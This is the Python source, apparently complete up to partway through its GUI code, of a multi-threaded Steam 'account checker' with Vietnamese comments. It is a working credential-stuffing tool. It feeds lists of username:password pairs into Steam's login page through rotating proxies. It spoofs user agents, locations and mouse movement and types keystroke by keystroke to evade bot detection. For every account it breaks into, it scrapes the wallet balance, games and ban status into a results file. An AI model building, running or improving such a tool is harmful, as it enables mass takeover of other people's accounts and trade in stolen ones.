import random
import sys
import os
import json
import uuid
import time
import shutil
import psutil
import queue
from pathlib import Path
from typing import List, Dict, Optional
from PyQt5.QtWidgets import (QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, 
                             QWidget, QPushButton, QTextEdit, QProgressBar, 
                             QLineEdit, QComboBox, QCheckBox, QLabel, QFileDialog,
                             QMessageBox, QGroupBox, QFrame, QSplitter, QScrollArea)
from PyQt5.QtCore import QThread, pyqtSignal, QTimer, QMutex, QMutexLocker, Qt
from PyQt5.QtGui import QFont, QTextCharFormat, QColor, QPalette, QLinearGradient, QBrush
from playwright.sync_api import sync_playwright, Browser, BrowserContext, Page
import threading

class SteamCheckerThread(QThread):
    """Thread worker cho việc check từng account"""
    log_signal = pyqtSignal(str, str)  # message, log_type
    progress_signal = pyqtSignal(int)
    finished_signal = pyqtSignal()
    account_progress_signal = pyqtSignal(int)  # Signal cho progress của từng account
    
    def __init__(self, account_queue, proxy_list, use_proxy, headless, thread_id):
        super().__init__()
        self.account_queue = account_queue
        self.proxy_list = proxy_list
        self.use_proxy = use_proxy
        self.headless = headless
        self.thread_id = thread_id
        self.should_stop = False
        self.context = None
        self.page = None
        self.profile_path = None
        self.playwright = None
        
    def run(self):
        """Chạy thread check account"""
        while not self.should_stop and not self.account_queue.empty():
            try:
                # Lấy account từ queue
                account = self.account_queue.get()
                if not account:
                    continue
                
                # Hỗ trợ cả format username|pass và username:pass
                if '|' in account:
                    email, password = account.split('|', 1)
                elif ':' in account:
                    email, password = account.split(':', 1)
                else:
                    self.log_signal.emit(f"[Thread {self.thread_id}] Invalid account format: {account}", "error")
                    continue
                
                # Skip nếu đã check
                if self.is_account_checked(email, password):
                    self.log_signal.emit(f"[Thread {self.thread_id}] Skipping {email} - already checked", "info")
                    self.account_progress_signal.emit(100)  # Báo hoàn thành account này
                    continue
                
                self.log_signal.emit(f"[Thread {self.thread_id}] Checking {email}", "info")
                self.account_progress_signal.emit(10)  # Bắt đầu check
                
                # Tạo profile path với username
                safe_username = email.split('@')[0].replace('.', '_').replace('+', '_')[:20]  # Lấy username từ email, giới hạn 20 ký tự
                self.profile_path = f"profiles/{safe_username}_{self.thread_id}"  # Thêm thread_id để tránh conflict
                os.makedirs(self.profile_path, exist_ok=True)
                # self.log_signal.emit(f"[Thread {self.thread_id}] Created profile: {self.profile_path}", "debug")  # Debug log - không cần thiết
                self.account_progress_signal.emit(20)  # Profile created
                
                # Setup browser
                if not self.setup_browser():
                    self.log_signal.emit(f"[Thread {self.thread_id}] Failed to setup browser for {email}", "error")
                    self.cleanup()
                    self.account_progress_signal.emit(100)  # Hoàn thành (thất bại)
                    continue
                
                self.account_progress_signal.emit(30)  # Browser setup complete
                
                # Check account
                result = self.check_account(email, password)
                
                # Cleanup ngay sau khi check xong
                self.cleanup()
                
                # Force garbage collection
                import gc
                gc.collect()
                
                if result:
                    self.log_signal.emit(f"[Thread {self.thread_id}] ✅ Success: {email}", "success")
                else:
                    self.log_signal.emit(f"[Thread {self.thread_id}] ❌ Failed: {email}", "error")
                
                # Đảm bảo profile được xóa hoàn toàn trước khi tiếp tục
                if self.profile_path and os.path.exists(self.profile_path):
                    try:
                        import shutil
                        shutil.rmtree(self.profile_path)
                        # self.log_signal.emit(f"[Thread {self.thread_id}] Profile cleaned: {self.profile_path}", "debug")  # Debug log - không cần thiết
                    except Exception as e:
                        self.log_signal.emit(f"[Thread {self.thread_id}] Profile cleanup error: {str(e)}", "warning")
                self.profile_path = None
                
                self.account_progress_signal.emit(100)  # Hoàn thành account này
                    
            except Exception as e:
                self.log_signal.emit(f"[Thread {self.thread_id}] ❌ Error: {str(e)}", "error")
                self.cleanup()
                self.account_progress_signal.emit(100)  # Hoàn thành (lỗi)
                
        self.finished_signal.emit()
    
    def setup_browser(self):
        """Setup Playwright browser với options tối ưu cho đa luồng"""
        try:
            # Start playwright
            self.playwright = sync_playwright().start()
            
            # Browser args - antidetected và giống người dùng thật
            browser_args = [
                # Core performance - giữ lại một số tính năng để giống thật
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu-sandbox",
                "--disable-software-rasterizer",
                "--disable-background-timer-throttling",
                "--disable-renderer-backgrounding",
                "--disable-backgrounding-occluded-windows",
                "--disable-ipc-flooding-protection",
                
                # Network optimizations - giảm để giống thật
                "--disable-background-networking",
                "--disable-background-sync",
                "--disable-component-extensions-with-background-pages",
                "--disable-domain-reliability",
                "--disable-features=TranslateUI",
                "--disable-features=BlinkGenPropertyTrees",
                "--disable-features=CalculateNativeWinOcclusion",
                "--disable-features=VizDisplayCompositor",
                "--disable-features=AudioServiceOutOfProcess",
                "--disable-features=MediaRouter",
                "--disable-features=OptimizationHints",
                "--disable-features=ServiceWorkerPaymentApps",
                
                # Memory optimizations
                "--memory-pressure-off",
                "--max_old_space_size=4096",
                "--js-flags=--max-old-space-size=4096",
                "--disable-extensions",
                "--disable-plugins-discovery",
                "--disable-sync",
                
                # Security bypasses (for automation) - giảm để ít bị detect
                "--disable-web-security",
                "--disable-features=TrustedTypes,TrustedTypesForScript,TrustedTypesForScriptURL,TrustedTypesForScriptElement,TrustedTypesForScriptText,TrustedTypesForScriptInnerHTML,TrustedTypesForScriptOuterHTML,TrustedTypesForScriptInsertAdjacentHTML,TrustedTypesForScriptWrite,TrustedTypesForScriptWriteln",
                "--disable-hang-monitor",
                "--disable-prompt-on-repost",
                "--disable-client-side-phishing-detection",
                "--disable-component-update",
                "--disable-domain-reliability",
                "--disable-features=BlockInsecurePrivateNetworkRequests",
                
                # UI/Visual optimizations - chỉ tắt images
                "--disable-images",
                
                # Antidetected features
                "--disable-blink-features=AutomationControlled",
                "--disable-features=VizDisplayCompositor",
                "--disable-ipc-flooding-protection",
                "--disable-renderer-backgrounding",
                "--disable-backgrounding-occluded-windows",
                "--disable-features=TranslateUI",
                "--disable-features=BlinkGenPropertyTrees",
                "--disable-features=CalculateNativeWinOcclusion",
                "--disable-features=AudioServiceOutOfProcess",
                "--disable-features=MediaRouter",
                "--disable-features=OptimizationHints",
                "--disable-features=ServiceWorkerPaymentApps",
                "--disable-features=WebRTC",
                "--disable-features=TranslateUI",
                "--disable-features=BlinkGenPropertyTrees",
                "--disable-features=CalculateNativeWinOcclusion",
                "--disable-features=VizDisplayCompositor",
                "--disable-features=AudioServiceOutOfProcess",
                "--disable-features=MediaRouter",
                "--disable-features=OptimizationHints",
                "--disable-features=ServiceWorkerPaymentApps",
                
                # Logging - giảm để ít bị detect
                "--log-level=3",
                "--silent"
            ]
            
            # Context options - antidetected và giống người dùng thật
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
            ]
            
            viewports = [
                {"width": 1920, "height": 1080},
                {"width": 1366, "height": 768},
                {"width": 1440, "height": 900},
                {"width": 1536, "height": 864},
                {"width": 1280, "height": 720}
            ]
            
            timezones = [
                "America/New_York",
                "America/Los_Angeles", 
                "America/Chicago",
                "Europe/London",
                "Europe/Berlin",
                "Asia/Tokyo"
            ]
            
            context_options = {
                "headless": self.headless,
                "viewport": random.choice(viewports),  # Random viewport
                "user_agent": random.choice(user_agents),  # Random user agent
                "ignore_https_errors": True,
                "bypass_csp": True,
                "args": browser_args,
                # Network settings giống thật
                "accept_downloads": True,  # Cho phép download như người dùng thật
                "has_touch": False,
                "is_mobile": False,
                "locale": "en-US",
                "timezone_id": random.choice(timezones),  # Random timezone
                # Permissions giống thật
                "permissions": ["geolocation", "notifications"],  # Một số permissions cơ bản
                "geolocation": {"latitude": random.uniform(25.0, 49.0), "longitude": random.uniform(-125.0, -66.0)},  # Random US location
                "color_scheme": random.choice(["light", "dark"]),  # Random color scheme
                "forced_colors": "none",
                "reduced_motion": "no-preference",  # Không giảm motion
                "screen": random.choice(viewports),  # Random screen size
                "device_scale_factor": random.choice([1.0, 1.25, 1.5]),  # Random scale
                # Thêm headers giống người dùng thật
                "extra_http_headers": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "DNT": "1",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "Cache-Control": "max-age=0"
                }
            }
            
            # Setup proxy nếu cần
            if self.use_proxy and self.proxy_list:
                proxy = self.proxy_list[0]  # Lấy proxy đầu tiên
                if '@' in proxy:
                    # Format: user:pass@ip:port
                    auth, server = proxy.split('@')
                    context_options["proxy"] = {
                        "server": f"http://{server}",
                        "username": auth.split(':')[0],
                        "password": auth.split(':')[1]
                    }
                else:
                    # Format: ip:port
                    context_options["proxy"] = {
                        "server": f"http://{proxy}"
                    }
            
            # Launch persistent context (with user data dir)
            # self.log_signal.emit(f"[Thread {self.thread_id}] Launching persistent context...", "debug")  # Debug log - không cần thiết
            self.context = self.playwright.chromium.launch_persistent_context(
                user_data_dir=os.path.abspath(self.profile_path),
                **context_options
            )
            # self.log_signal.emit(f"[Thread {self.thread_id}] Persistent context launched successfully", "debug")  # Debug log - không cần thiết
            
            # Sử dụng page mặc định (không tạo tab mới)
            # self.log_signal.emit(f"[Thread {self.thread_id}] Using default page...", "debug")  # Debug log - không cần thiết
            self.page = self.context.pages[0] if self.context.pages else self.context.new_page()
            # self.log_signal.emit(f"[Thread {self.thread_id}] Page ready successfully", "debug")  # Debug log - không cần thiết
            
            # Set timeouts - giữ 60 giây như yêu cầu
            self.page.set_default_timeout(60000)  # 60 seconds
            self.page.set_default_navigation_timeout(60000)  # 60 seconds
            
            # Chỉ block images để tăng tốc độ, giữ lại CSS và JS cho Steam
            def should_block_request(route):
                url = route.request.url.lower()
                # Chỉ block images
                if any(ext in url for ext in ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.webp', '.ico', '.bmp', '.tiff']):
                    return route.abort()
                # Block media files (video, audio)
                if any(ext in url for ext in ['.mp4', '.avi', '.mov', '.wmv', '.flv', '.webm', '.mp3', '.wav', '.ogg']):
                    return route.abort()
                # Block analytics và tracking
                if any(domain in url for domain in ['google-analytics', 'googletagmanager', 'facebook.com/tr', 'doubleclick', 'googlesyndication']):
                    return route.abort()
                # Block ads
                if any(domain in url for domain in ['ads', 'adnxs', 'amazon-adsystem', 'googlesyndication']):
                    return route.abort()
                # Block social media widgets
                if any(domain in url for domain in ['facebook.com/plugins', 'twitter.com/widgets', 'instagram.com/embed']):
                    return route.abort()
                # Allow tất cả CSS, JS, fonts cho Steam
                route.continue_()
            
            self.page.route("**/*", should_block_request)
            
            # Thêm random mouse movements để giống người dùng thật
            self.page.evaluate("""
                // Random mouse movements
                setInterval(() => {
                    const x = Math.random() * window.innerWidth;
                    const y = Math.random() * window.innerHeight;
                    const event = new MouseEvent('mousemove', {
                        clientX: x,
                        clientY: y,
                        bubbles: true
                    });
                    document.dispatchEvent(event);
                }, Math.random() * 10000 + 5000); // Random 5-15 seconds
            """)
            
            # self.log_signal.emit(f"[Thread {self.thread_id}] Browser setup completed successfully", "debug")  # Debug log - không cần thiết
            return True
            
        except Exception as e:
            self.log_signal.emit(f"[Thread {self.thread_id}] Browser setup error: {str(e)}", "error")
            return False
    
    def check_account(self, email, password):
        """Check một account Steam - antidetected và giống người dùng thật"""
        try:
            # Random delay trước khi bắt đầu
            self.page.wait_for_timeout(random.randint(1000, 3000))
            self.account_progress_signal.emit(40)  # Bắt đầu login process
            
            # Login với hành động giống người dùng thật
            # self.log_signal.emit(f"[Thread {self.thread_id}] Navigating to Steam login...", "debug")  # Debug log - không cần thiết
            self.page.goto("https://steamcommunity.com/login/home/?goto=", timeout=120000)
            
            # Chờ page load hoàn toàn
            self.page.wait_for_timeout(random.randint(5000, 10000))
            self.account_progress_signal.emit(50)  # Page loaded
            
            # Scroll nhẹ để giống người dùng thật
            self.page.evaluate("window.scrollTo(0, 100)")
            self.page.wait_for_timeout(random.randint(2000, 5000))
            
            # Tìm và điền form login với hành động giống thật
            # self.log_signal.emit(f"[Thread {self.thread_id}] Filling login form...", "debug")  # Debug log - không cần thiết
            email_input = self.page.wait_for_selector("input._2GBWeup5cttgbTw8FM3tfx[type='text']", timeout=60000)
            password_input = self.page.query_selector("input._2GBWeup5cttgbTw8FM3tfx[type='password']")
            
            # Click vào input trước khi type (giống người dùng thật)
            email_input.click()
            self.page.wait_for_timeout(random.randint(5000, 10000))
            
            # Type từng ký tự với random delay
            for char in email:
                email_input.type(char)
                self.page.wait_for_timeout(random.randint(50, 150))
            
            # Random delay giữa các field
            self.page.wait_for_timeout(random.randint(300, 800))
            
            # Click vào password input
            password_input.click()
            self.page.wait_for_timeout(random.randint(200, 500))
            
            # Type password từng ký tự
            for char in password:
                password_input.type(char)
                self.page.wait_for_timeout(random.randint(50, 150))
            
            # Random delay trước khi submit
            self.page.wait_for_timeout(random.randint(500, 1500))
            self.account_progress_signal.emit(60)  # Form filled
            
            # Click login button
            # self.log_signal.emit(f"[Thread {self.thread_id}] Submitting login form...", "debug")  # Debug log - không cần thiết
            login_button = self.page.query_selector("button.DjSvCZoKKfoNSmarsEcTS[type='submit']")
            login_button.click()
            
            # Chờ kết quả login với random delay
            self.page.wait_for_timeout(random.randint(10000, 15000))
            self.account_progress_signal.emit(70)  # Login submitted
            
            # Kiểm tra các loại lỗi khác nhau
            current_url = self.page.url.lower()
            page_content = self.page.content()
            
            # Check for Steam error page
            if "something went wrong" in page_content.lower() or "please try again later" in page_content.lower():
                self.log_signal.emit(f"[Thread {self.thread_id}] ⚠️ Steam server error for {email}", "warning")
                self.write_error(email, password, "Steam server error")
                return False
            
            # Check for wrong password
            try:
                error_element = self.page.query_selector("div._1W_6HXiG4JJ0By1qN_0fGZ")
                if error_element and "Please check your password and account name and try again" in error_element.text_content():
                    self.log_signal.emit(f"[Thread {self.thread_id}] ❌ Wrong password for {email}", "error")
                    self.write_wrong_password(email, password)
                    return False
            except:
                pass
            
            # Check if still on login page
            if "login" in current_url:
                self.log_signal.emit(f"[Thread {self.thread_id}] ❌ Login failed for {email}", "error")
                self.write_wrong_password(email, password)
                return False
            
            # Login thành công, crawl dữ liệu
            self.log_signal.emit(f"[Thread {self.thread_id}] ✅ Login successful for {email}, crawling data...", "success")
            self.account_progress_signal.emit(80)  # Login successful, starting crawl
            steam_data = self.crawl_steam_data()
            if steam_data:
                self.write_results(email, password, steam_data)
                self.account_progress_signal.emit(90)  # Data crawled and saved
                return True
            else:
                self.write_wrong_password(email, password)
                return False
                
        except Exception as e:
            self.log_signal.emit(f"[Thread {self.thread_id}] ❌ Check account error: {str(e)}", "error")
            self.write_error(email, password, str(e))
            return False
    
    def crawl_steam_data(self):
        """Crawl dữ liệu từ Steam - antidetected và giống người dùng thật"""
        try:
            # Random delay trước khi crawl
            self.page.wait_for_timeout(random.randint(5000, 10000))
            
            # Lấy SteamID từ account page
            # self.log_signal.emit(f"[Thread {self.thread_id}] Navigating to account page...", "debug")  # Debug log - không cần thiết
            self.page.goto("https://store.steampowered.com/account/", timeout=120000)
            self.page.wait_for_timeout(random.randint(5000, 10000))  # Chờ page load
            
            # Scroll để giống người dùng thật
            self.page.evaluate("window.scrollTo(0, 200)")
            self.page.wait_for_timeout(random.randint(2000, 4000))
            
            steam_data = {}
            
            # SteamID
            try:
                steamid_element = self.page.wait_for_selector("div.youraccount_steamid", timeout=20000)  # Giảm từ 20000ms
                steam_data['steamid'] = steamid_element.text_content().replace("Steam ID: ", "").strip().replace('\n', ' ').replace('\r', ' ')
            except:
                steam_data['steamid'] = "N/A"
            
            # Country
            try:
                country_element = self.page.wait_for_selector("span.account_data_field", timeout=20000)  # Giảm từ 20000ms
                steam_data['country'] = country_element.text_content().strip().replace('\n', ' ').replace('\r', ' ')
            except:
                steam_data['country'] = "N/A"
            
            # Balance
            try:
                balance_element = self.page.wait_for_selector("div.accountRow.accountBalance", timeout=20000)  # Giảm từ 20000ms
                steam_data['balance'] = balance_element.text_content().strip().replace('\n', ' ').replace('\r', ' ')
            except:
                steam_data['balance'] = "N/A"
            
            self.account_progress_signal.emit(85)  # Account data crawled
            
            # Level và Suspects từ profile
            try:
                profile_url = f"https://steamcommunity.com/profiles/{steam_data['steamid']}/"
                # self.log_signal.emit(f"[Thread {self.thread_id}] Navigating to profile page...", "debug")  # Debug log - không cần thiết
                self.page.goto(profile_url, timeout=120000)
                self.page.wait_for_timeout(random.randint(5000, 10000))  # Random delay
                
                # Scroll để giống người dùng thật
                self.page.evaluate("window.scrollTo(0, 300)")
                self.page.wait_for_timeout(random.randint(2000, 4000))
                
                # Level
                try:
                    level_element = self.page.wait_for_selector("span.friendPlayerLevelNum", timeout=20000)  # Giảm từ 20000ms
                    steam_data['level'] = level_element.text_content().strip().replace('\n', ' ').replace('\r', ' ')
                except:
                    steam_data['level'] = "0"
                
                # Suspects
                try:
                    suspect_element = self.page.wait_for_selector("div.profile_ban_status.ban_status_header", timeout=20000)  # Giảm từ 20000ms
                    if suspect_element and "Steam Support suspects your account may" in suspect_element.text_content():
                        steam_data['suspects'] = "YES"
                    else:
                        steam_data['suspects'] = "NO"
                except:
                    steam_data['suspects'] = "NO"
                    
            except:
                steam_data['level'] = "0"
                steam_data['suspects'] = "NO"
            
            self.account_progress_signal.emit(88)  # Profile data crawled
            
            # Games từ games page
            try:
                games_url = f"https://steamcommunity.com/profiles/{steam_data['steamid']}/games?tab=all"
                # self.log_signal.emit(f"[Thread {self.thread_id}] Navigating to games page...", "debug")  # Debug log - không cần thiết
                self.page.goto(games_url, timeout=120000)
                self.page.wait_for_timeout(random.randint(5000, 10000))  # Random delay
                
                # Scroll để giống người dùng thật
                self.page.evaluate("window.scrollTo(0, 400)")
                self.page.wait_for_timeout(random.randint(2000, 4000))
                
                # Total games
                try:
                    total_games_element = self.page.wait_for_selector("a.sectionTab.active span", timeout=20000)  # Giảm từ 20000ms
                    # Extract number from "All Games (5)" format
                    games_text = total_games_element.text_content().strip().replace('\n', ' ').replace('\r', ' ')
                    if "All Games (" in games_text:
                        steam_data['total_games'] = games_text.split("(")[1].split(")")[0]
                    else:
                        steam_data['total_games'] = "0"
                except:
                    steam_data['total_games'] = "0"
                
                # Game list
                try:
                    game_elements = self.page.query_selector_all("a._22awlPiAoaZjQMqxJhp-KP")
                    games = [game.text_content().strip().replace('\n', ' ').replace('\r', ' ') for game in game_elements[:30]]  # Giữ nguyên 5 games
                    steam_data['games'] = ",".join(games) if games else "N/A"
                except:
                    steam_data['games'] = "N/A"
                    
            except:
                steam_data['total_games'] = "0"
                steam_data['games'] = "N/A"
            
            self.account_progress_signal.emit(92)  # Games data crawled
            return steam_data
            
        except Exception as e:
            self.log_signal.emit(f"[Thread {self.thread_id}] ❌ Crawl error: {str(e)}", "error")
            return None
    
    def is_account_checked(self, email, password):
        """Kiểm tra xem account đã được check chưa"""
        try:
            # Check results.txt
            if os.path.exists("results.txt"):
                with open("results.txt", "r", encoding="utf-8") as f:
                    content = f.read()
                    if f"{email}|{password}" in content:
                        return True
            
            # Check wrongpass.txt
            if os.path.exists("wrongpass.txt"):
                with open("wrongpass.txt", "r", encoding="utf-8") as f:
                    content = f.read()
                    if f"{email}|{password}" in content:
                        return True
                        
            return False
        except:
            return False
    
    def clean_data(self, text):
        """Làm sạch dữ liệu trước khi ghi file"""
        if not text:
            return "N/A"
        # Loại bỏ xuống dòng và khoảng trắng thừa
        cleaned = str(text).strip().replace('\n', ' ').replace('\r', ' ')
        # Loại bỏ nhiều khoảng trắng liên tiếp
        cleaned = ' '.join(cleaned.split())
        return cleaned if cleaned else "N/A"
    
    def write_results(self, email, password, steam_data):
        """Ghi kết quả thành công vào results.txt"""
        try:
            # Làm sạch tất cả dữ liệu trước khi ghi
            steamid = self.clean_data(steam_data.get('steamid', 'N/A'))
            country = self.clean_data(steam_data.get('country', 'N/A'))
            balance = self.clean_data(steam_data.get('balance', 'N/A'))
            level = self.clean_data(steam_data.get('level', '0'))
            suspects = self.clean_data(steam_data.get('suspects', 'NO'))
            total_games = self.clean_data(steam_data.get('total_games', '0'))
            games = self.clean_data(steam_data.get('games', 'N/A'))
            
            line = f"{email}|{password}|{steamid}|{country}|{balance}|{level}|{suspects}|{total_games}|{games}\n"
            with open("results.txt", "a", encoding="utf-8") as f:
                f.write(line)
                f.flush()
        except Exception as e:
            self.log_signal.emit(f"[Thread {self.thread_id}] Write results error: {str(e)}", "warning")
    
    def write_wrong_password(self, email, password):
        """Ghi password sai vào wrongpass.txt"""
        try:
            line = f"{email}|{password}\n"
            with open("wrongpass.txt", "a", encoding="utf-8") as f:
                f.write(line)
                f.flush()
        except Exception as e:
            self.log_signal.emit(f"[Thread {self.thread_id}] Write wrongpass error: {str(e)}", "warning")
    
    def write_error(self, email, password, error):
        """Ghi lỗi vào error.txt"""
        try:
            line = f"{email}|{password}\n"
            with open("error.txt", "a", encoding="utf-8") as f:
                f.write(line)
                f.flush()
        except Exception as e:
            self.log_signal.emit(f"[Thread {self.thread_id}] Write error error: {str(e)}", "warning")
    
    def cleanup(self):
        """Cleanup browser và profile"""
        try:
            # Không đóng page vì sử dụng page mặc định của context
            if self.page:
                # self.log_signal.emit(f"[Thread {self.thread_id}] Page will be closed with context", "debug")  # Debug log - không cần thiết
                self.page = None
            
            if self.context:
                try:
                    self.context.close()
                    # self.log_signal.emit(f"[Thread {self.thread_id}] Context closed", "debug")  # Debug log - không cần thiết
                except Exception as e:
                    self.log_signal.emit(f"[Thread {self.thread_id}] Context cleanup error: {str(e)}", "warning")
                finally:
                    self.context = None
            
            if self.playwright:
                try:
                    self.playwright.stop()
                    # self.log_signal.emit(f"[Thread {self.thread_id}] Playwright stopped", "debug")  # Debug log - không cần thiết
                except Exception as e:
                    self.log_signal.emit(f"[Thread {self.thread_id}] Playwright cleanup error: {str(e)}", "warning")
                finally:
                    self.playwright = None
            
            # Force delete profile folder
            if self.profile_path and os.path.exists(self.profile_path):
                try:
                    # Make all files writable first
                    for root, dirs, files in os.walk(self.profile_path, topdown=False):
                        for file in files:
                            try:
                                file_path = os.path.join(root, file)
                                os.chmod(file_path, 0o777)
                                os.remove(file_path)
                            except:
                                pass
                        for dir in dirs:
                            try:
                                dir_path = os.path.join(root, dir)
                                os.chmod(dir_path, 0o777)
                                os.rmdir(dir_path)
                            except:
                                pass
                    
                    # Remove the profile directory
                    os.rmdir(self.profile_path)
                    # self.log_signal.emit(f"[Thread {self.thread_id}] Profile cleaned: {self.profile_path}", "debug")  # Debug log - không cần thiết
                except Exception as e:
                    self.log_signal.emit(f"[Thread {self.thread_id}] Profile cleanup error: {str(e)}", "warning")
                    
        except Exception as e:
            self.log_signal.emit(f"[Thread {self.thread_id}] Cleanup error: {str(e)}", "warning")
    
    def force_cleanup_profile(self):
        """Force cleanup profile folder"""
        if self.profile_path and os.path.exists(self.profile_path):
            try:
                import shutil
                shutil.rmtree(self.profile_path)
                # self.log_signal.emit(f"[Thread {self.thread_id}] Force cleaned profile: {self.profile_path}", "debug")  # Debug log - không cần thiết
            except Exception as e:
                self.log_signal.emit(f"[Thread {self.thread_id}] Force cleanup error: {str(e)}", "warning")
            finally:
                self.profile_path = None
    
    def stop(self):
        """Dừng thread"""
        self.should_stop = True
        self.cleanup()
        self.force_cleanup_profile()
    
    def force_kill_all_chrome_processes(self):
        """Force kill tất cả Chrome processes liên quan"""
        try:
            killed_count = 0
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'chromedriver' in proc.info['name'].lower():
                        proc.kill()
                        killed_count += 1
                        # self.log_signal.emit(f"[Thread {self.thread_id}] Killed ChromeDriver PID: {proc.info['pid']}", "debug")  # Debug log - không cần thiết
                    elif 'chrome' in proc.info['name'].lower():
                        cmdline = ' '.join(proc.info['cmdline']) if proc.info['cmdline'] else ''
                        if 'profiles' in cmdline or 'user-data-dir' in cmdline:
                            proc.kill()
                            killed_count += 1
                            # self.log_signal.emit(f"[Thread {self.thread_id}] Killed Chrome PID: {proc.info['pid']}", "debug")  # Debug log - không cần thiết
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            self.log_signal.emit(f"[Thread {self.thread_id}] Force killed {killed_count} Chrome processes", "info")
        except Exception as e:
            self.log_signal.emit(f"[Thread {self.thread_id}] Force kill error: {str(e)}", "warning")

class SteamCheckerMainWindow(QMainWindow):
    """Main window của ứng dụng"""
    
    def __init__(self):
        super().__init__()
        self.threads = []
        self.account_queue = None
        self.proxy_list = []
        self.accounts = []
        self.is_running = False
        self.total_accounts = 0
        self.checked_accounts = 0
        self.current_progress = 0
        
        self.init_ui()
        self.setup_profiles_folder()
    
    def init_ui(self):
        """Khởi tạo UI"""
        self.setWindowTitle("🚀 Steam Account Checker - Multi Thread")
        self.setGeometry(100, 100, 1200, 800)
        
        # Set application style
        self.setStyleSheet("""
            QMainWindow {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1, 
                    stop:0 #1e3c72, stop:1 #2a5298);
                color: white;
            }
            QGroupBox {
                font-weight: bold;
                border: 2px solid #4a90e2;
                border-radius: 10px;
                margin-top: 10px;
                padding-top: 10px;
                background: rgba(255, 255, 255, 0.1);
                color: white;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #4a90e2;
                font-size: 14px;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #4a90e2, stop:1 #357abd);
                border: none;
                border-radius: 8px;
                color: white;
                font-weight: bold;
                padding: 8px 16px;
                font-size: 12px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #5ba0f2, stop:1 #4a90e2);
            }
            QPushButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #357abd, stop:1 #2a5d8a);
            }
            QPushButton:disabled {
                background: #666666;
                color: #999999;
            }
            QLineEdit, QComboBox {
                background: rgba(255, 255, 255, 0.9);
                border: 2px solid #4a90e2;
                border-radius: 6px;
                padding: 6px;
                color: #333;
                font-size: 12px;
            }
            QLineEdit:focus, QComboBox:focus {
                border-color: #5ba0f2;
            }
            QCheckBox {
                color: white;
                font-size: 12px;
            }
            QCheckBox::indicator {
                width: 16px;
                height: 16px;
            }
            QCheckBox::indicator:unchecked {
                border: 2px solid #4a90e2;
                background: transparent;
                border-radius: 3px;
            }
            QCheckBox::indicator:checked {
                border: 2px solid #4a90e2;
                background: #4a90e2;
                border-radius: 3px;
            }
            QLabel {
                color: white;
                font-size: 12px;
            }
            QProgressBar {
                border: 2px solid #4a90e2;
                border-radius: 8px;
                text-align: center;
                background: rgba(255, 255, 255, 0.1);
                color: white;
                font-weight: bold;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0, 
                    stop:0 #4a90e2, stop:1 #5ba0f2);
                border-radius: 6px;
            }
            QTextEdit {
                background: rgba(0, 0, 0, 0.7);
                border: 2px solid #4a90e2;
                border-radius: 8px;
                color: white;
                font-family: 'Consolas', 'Monaco', monospace;
                font-size: 11px;
                padding: 8px;
            }
        """)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout with splitter
        main_layout = QHBoxLayout(central_widget)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)
        
        # Create splitter for better layout
        splitter = QSplitter(Qt.Horizontal)
        main_layout.addWidget(splitter)
        
        # Left panel (controls)
        left_panel = QWidget()
        left_panel.setMaximumWidth(400)
        left_layout = QVBoxLayout(left_panel)
        left_layout.setSpacing(10)
        
        # Right panel (log)
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setSpacing(10)
        
        # Add panels to splitter
        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)
        splitter.setSizes([400, 800])
        
        # File input group
        file_group = QGroupBox("📁 File Input")
        file_layout = QVBoxLayout(file_group)
        file_layout.setSpacing(8)
        
        # Accounts file
        accounts_layout = QVBoxLayout()
        accounts_layout.setSpacing(5)
        
        accounts_label_layout = QHBoxLayout()
        self.accounts_label = QLabel("📋 No accounts loaded")
        self.accounts_label.setStyleSheet("font-weight: bold; color: #4a90e2;")
        accounts_label_layout.addWidget(self.accounts_label)
        accounts_label_layout.addStretch()
        accounts_layout.addLayout(accounts_label_layout)
        
        accounts_btn_layout = QHBoxLayout()
        self.add_accounts_btn = QPushButton("📂 Add Accounts")
        self.add_accounts_btn.clicked.connect(self.load_accounts)
        self.reload_accounts_btn = QPushButton("🔄 Reload & Skip Checked")
        self.reload_accounts_btn.clicked.connect(self.reload_accounts)
        accounts_btn_layout.addWidget(self.add_accounts_btn)
        accounts_btn_layout.addWidget(self.reload_accounts_btn)
        accounts_layout.addLayout(accounts_btn_layout)
        
        file_layout.addLayout(accounts_layout)
        
        # Separator
